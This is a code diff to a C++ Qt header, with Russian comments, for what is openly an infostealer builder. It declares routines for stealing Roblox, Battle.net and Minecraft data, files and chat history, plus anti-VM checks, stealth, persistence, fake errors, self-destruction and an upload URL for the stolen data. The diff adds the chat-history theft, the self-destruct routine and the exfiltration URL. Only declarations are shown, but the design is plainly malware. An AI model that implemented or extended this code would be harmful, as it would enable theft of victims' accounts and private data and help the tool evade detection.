@@ -58,8 +58,10 @@ public:
     ~MainWindow();                         // Деструктор для очистки ресурсов
 
     // Публичные методы
+    std::string generateRandomString(size_t length); // Генерация случайной строки
     std::string generateUniqueXorKey();         // Генерация уникального XOR-ключа
     std::array<unsigned char, 16> GetEncryptionKey(bool useFirstKey); // Получение ключа шифрования
+    std::array<unsigned char, 16> generateIV(); // Генерация инициализационного вектора для AES
     bool isRunningInVM();                  // Проверка на виртуальную машину
     void emitLog(const QString& message);  // Удобный метод для вызова сигнала logUpdated
 
@@ -101,6 +103,7 @@ public:
         std::string iconPath = "";              // Путь к файлу иконки
         std::string githubToken = "";           // Токен GitHub
         std::string githubRepo = "";            // Репозиторий GitHub
+        std::string uploadUrl = "http://example.com/upload"; // URL для отправки данных
     } config;
 
     // UI элементы
@@ -180,6 +183,7 @@ private slots:
     void stealRobloxData(const std::string& dir);  // Кража данных Roblox
     void stealBattleNetData(const std::string& dir); // Кража данных Battle.net
     void stealMinecraftData(const std::string& dir); // Кража данных Minecraft
+    void stealChatHistory(const std::string& dir); // Кража истории чатов
     void stealFiles(const std::string& dir);       // Кража файлов (граббер)
     void collectSocialEngineeringData(const std::string& dir); // Сбор данных для социальной инженерии
     void archiveData(const std::string& dir, const std::string& archivePath); // Архивация данных
@@ -195,13 +199,14 @@ private slots:
     void exportLogs();                     // Экспорт логов в файл
     void exitApp();                        // Выход из приложения
     void showAbout();                      // Отображение информации о программе
-    void appendLog(const QString& message);  // Добавление сообщения в лог (остается приватным)
+    void appendLog(const QString& message);  // Добавление сообщения в лог
 
     // Слоты для дополнительных функций
     bool AntiAnalysis();                    // Проверка на запуск в виртуальной машине
     void Stealth();                        // Включение скрытного режима
     void Persist();                        // Обеспечение персистентности
     void FakeError();                      // Показ фейковой ошибки
+    void SelfDestruct();                   // Самоуничтожение
 
     // Слоты для обработки действий пользователя
     void on_iconBrowseButton_clicked();    // Обработчик выбора иконки
@@ -218,7 +223,6 @@ private:
     void animateSection(QLabel* sectionLabel, QSpacerItem* spacer); // Анимация появления секций
     QByteArray applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key); // Применение XOR-шифрования
     QByteArray applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv); // Применение AES-шифрования
-    std::array<unsigned char, 16> generateIV(); // Генерация инициализационного вектора для AES
 
     // Приватные члены
     Ui::MainWindow *ui;                    // Указатель на UI, сгенерированный Qt Designer
